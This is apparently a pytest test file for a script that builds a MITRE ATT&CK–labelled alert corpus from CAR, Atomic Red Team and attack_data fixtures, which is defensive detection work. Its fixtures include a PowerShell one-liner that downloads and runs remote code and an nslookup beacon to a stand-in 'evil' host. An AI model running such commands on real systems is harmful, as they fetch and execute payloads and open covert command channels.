#!/usr/bin/env python3
"""Tests for scripts/build_label_corpus.py.
Fixtures mimic the shapes verified against the upstream checkouts; the model never
runs and nothing is fetched.
"""
from __future__ import annotations
import os

os.environ.setdefault("WAZUH_INDEXER_URL", "https://indexer:9200")
os.environ.setdefault("WAZUH_INDEXER_PASSWORD", "test-indexer-pass")

import importlib.util
import json
from pathlib import Path
import pytest
import yaml

SCRIPT = Path(__file__).resolve().parent.parent / "scripts" / "build_label_corpus.py"
_spec = importlib.util.spec_from_file_location("build_label_corpus", SCRIPT)
corpus = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(corpus)


def _tactic(shortname: str, name: str, external_id: str) -> dict:
    return {"type": "x-mitre-tactic", "x_mitre_shortname": shortname, "name": name,
            "external_references": [{"source_name": "mitre-attack", "external_id": external_id}]}


def _technique(external_id: str, phases: list[str], deprecated: bool = False) -> dict:
    return {"type": "attack-pattern", "x_mitre_deprecated": deprecated,
            "external_references": [{"source_name": "mitre-attack", "external_id": external_id}],
            "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": phase}
                                  for phase in phases]}


@pytest.fixture()
def fixtures(tmp_path):
    stix = tmp_path / "enterprise-attack.json"
    stix.write_text(json.dumps({"objects": [
        {"type": "x-mitre-collection", "x_mitre_version": "18.0"},
        _tactic("execution", "Execution", "TA0002"),
        _tactic("command-and-control", "Command and Control", "TA0011"),
        _tactic("persistence", "Persistence", "TA0003"),
        _technique("T1059", ["execution"]),
        _technique("T1071", ["command-and-control"]),
        _technique("T1078", ["execution", "persistence"]),
        _technique("T9999", ["execution"], deprecated=True),
    ]}), encoding="utf-8")

    car = tmp_path / "car"
    (car / "analytics").mkdir(parents=True)
    (car / "analytics" / "CAR-2020-01-001.yaml").write_text(yaml.safe_dump({
        "id": "CAR-2020-01-001", "title": "Suspicious command execution",
        "description": "A command interpreter ran a script from a temporary directory.",
        "coverage": [{"technique": "T1059", "tactics": ["Execution"]},
                     {"technique": "T9999", "tactics": ["Execution"]}],
    }), encoding="utf-8")

    atomic = tmp_path / "atomic"
    (atomic / "atomics" / "T1059").mkdir(parents=True)
    (atomic / "atomics" / "T1078").mkdir(parents=True)
    (atomic / "atomics" / "T1059" / "T1059.yaml").write_text(yaml.safe_dump({
        "attack_technique": "T1059",
        "atomic_tests": [
            {"name": "PowerShell download", "description": "Fetch a payload",
             "executor": {"name": "powershell", "command": "iex (New-Object Net.WebClient).DownloadString('http://x')"}},
            {"name": "Shell script", "description": "Run a shell script",
             "executor": {"name": "sh", "command": "sh /tmp/script.sh"}},
        ],
    }), encoding="utf-8")
    (atomic / "atomics" / "T1078" / "T1078.yaml").write_text(yaml.safe_dump({
        "attack_technique": "T1078", "atomic_tests": [{"name": "Valid accounts"}]}
    ), encoding="utf-8")

    attack_data = tmp_path / "attack_data"
    scenario = attack_data / "datasets" / "attack_techniques" / "T1071" / "dns_scenario"
    scenario.mkdir(parents=True)
    (scenario / "scenario.yml").write_text(yaml.safe_dump({
        "mitre_technique": ["T1071"], "description": "Beacon over DNS",
        "datasets": [{"name": "dns", "path": "/datasets/attack_techniques/T1071/dns_scenario/evt.log"}],
    }), encoding="utf-8")
    (scenario / "evt.log").write_text(
        '{"EventID":1,"CommandLine":"nslookup -type=txt beacon.evil.test"}\n', encoding="utf-8")

    return {"stix": stix, "sources": {"car": car, "atomic": atomic, "attack_data": attack_data}}


def _build(fixtures, cap=400, with_rule_mitre=False):
    return corpus.build(fixtures["sources"], fixtures["stix"], cap, with_rule_mitre)


def test_every_source_contributes_under_its_single_tactic(fixtures):
    rows, report = _build(fixtures)
    assert {row["source"] for row in rows} == {"car", "atomic", "attack_data"}
    by_source = {row["source"]: row for row in rows}
    assert by_source["car"]["ground_truth_tactic"] == "Execution"
    assert by_source["atomic"]["ground_truth_tactic"] == "Execution"
    assert by_source["attack_data"]["ground_truth_tactic"] == "Command and Control"
    assert report["techniques_multi_tactic"] == 1
    assert report["techniques_unknown_tactic"] == 0  # T9999 is deprecated, so it is skipped earlier.
    assert "T1078" not in {row["technique"] for row in rows}
    assert "cmd: nslookup" in by_source["attack_data"]["alert"]["rule"]["description"]


def test_deprecated_technique_never_appears(fixtures):
    rows, _report = _build(fixtures)
    assert "T9999" not in {row["technique"] for row in rows}


def test_rule_mitre_is_absent_by_default_and_present_on_the_ablation_run(fixtures):
    clean, _ = _build(fixtures)
    assert all("mitre" not in row["alert"]["rule"] for row in clean)
    leaky, _ = _build(fixtures, with_rule_mitre=True)
    leaked = next(row for row in leaky if row["source"] == "atomic")
    assert leaked["alert"]["rule"]["mitre"]["id"] == leaked["technique"]


def test_a_technique_never_spans_splits(fixtures):
    rows, report = _build(fixtures)
    splits: dict[str, set[str]] = {}
    for row in rows:
        splits.setdefault(row["technique"], set()).add(row["split"])
    assert all(len(found) == 1 for found in splits.values())
    assert sum(report["rows_per_split"].values()) == len(rows)


def test_cap_limits_rows_per_tactic_and_is_reported(fixtures):
    rows, report = _build(fixtures, cap=1)
    assert len([row for row in rows if row["tactic"] == "Execution"]) == 1
    assert report["capped"] == {"Execution": 2}


def test_identical_text_is_stored_once(fixtures):
    duplicate = fixtures["sources"]["car"] / "analytics" / "CAR-2020-01-002.yaml"
    duplicate.write_text(yaml.safe_dump({
        "id": "CAR-2020-01-002", "title": "Suspicious command execution",
        "description": "A command interpreter ran a script from a temporary directory.",
        "coverage": [{"technique": "T1059", "tactics": ["Execution"]}],
    }), encoding="utf-8")
    rows, report = _build(fixtures)
    assert report["deduped"] == 1
    assert len([row for row in rows if row["source"] == "car"]) == 1


def test_output_loads_in_the_calibration_harness(fixtures, tmp_path):
    rows, _report = _build(fixtures)
    out = tmp_path / "corpus.jsonl"
    corpus.write_jsonl(rows, out)
    cal_spec = importlib.util.spec_from_file_location(
        "calibrate_labeler_for_corpus", SCRIPT.parent / "calibrate_labeler.py")
    cal = importlib.util.module_from_spec(cal_spec)
    cal_spec.loader.exec_module(cal)
    cases = cal.load_cases(out)
    assert len(cases) == len(rows)
    assert all(case["state_text"].startswith("rule.description=") for case in cases)
